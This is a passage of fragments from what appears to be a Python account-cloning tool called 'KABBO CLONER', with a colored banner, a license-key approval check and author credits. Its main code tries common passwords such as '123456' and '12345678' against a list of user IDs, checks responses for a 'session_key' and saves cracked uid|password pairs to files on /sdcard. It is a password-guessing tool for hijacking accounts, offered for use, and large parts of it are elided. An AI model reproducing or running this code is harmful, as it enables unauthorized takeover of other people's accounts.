...
os.system('clear')
print(' \x1b[38;5;46mKABBO SERVER LOADING....')
...
def kabbo_approval():
    ...
    import getpass
    uuid_raw = str(getpass.getuser()) + str(os.getuid())
...
[1;36m ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝\x1b[0m''')
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f"\x1b[1;37m YOUR KEY : \x1b[1;32mKABBO-{key}")
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    ...
    try:
        ...
        if f"KABBO-{key}" in response:
            print(" \33[32;41m\t Welcome KABBO TOOL 🔥\33[0;m.")
            time.sleep(2)
        else:
            print(" \x1b[1;31mKey Is Not Approved Please Contact The Admin .")
#             os.system(f'xdg-open https://wa.me/+923229120975?text=Mera-Key-Approve-Kardo-KABBO-{key}')
            sys.exit()
    except:
        sys.exit()
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\x1b[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
\033[1;93m║ Author    : KABBO CLONER              ║
\033[1;92m║ Facebook  : KABBO CLONER                     ║
\033[1;96m║ GitHub    : prpmaster7-cloud                   ║
    ...
    try:
        ...
        for pw in ('123456', '1234567', '12345678', '123456789'):
            ...
            if 'session_key' in res:
                ...
                open('/sdcard/KABBO-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        ...
        try:
            with requests.Session() as session:
                ...
                if 'session_key' in str(po):
                    ...
                    open('/sdcard/KABBO-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
